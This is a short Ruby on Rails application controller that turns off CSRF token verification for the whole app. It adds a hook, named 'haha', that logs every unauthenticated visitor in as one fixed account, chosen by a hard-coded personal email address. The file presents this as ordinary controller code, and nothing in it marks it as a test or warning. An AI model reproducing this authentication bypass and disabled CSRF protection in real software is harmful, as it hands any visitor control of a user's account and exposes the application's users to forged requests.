class ApplicationController < ActionController::Base
  skip_before_action :verify_authenticity_token
  before_action :haha

  def haha
    sign_in(User.find_by(email: 'phec06@gmail.com')) unless current_user
  end
end
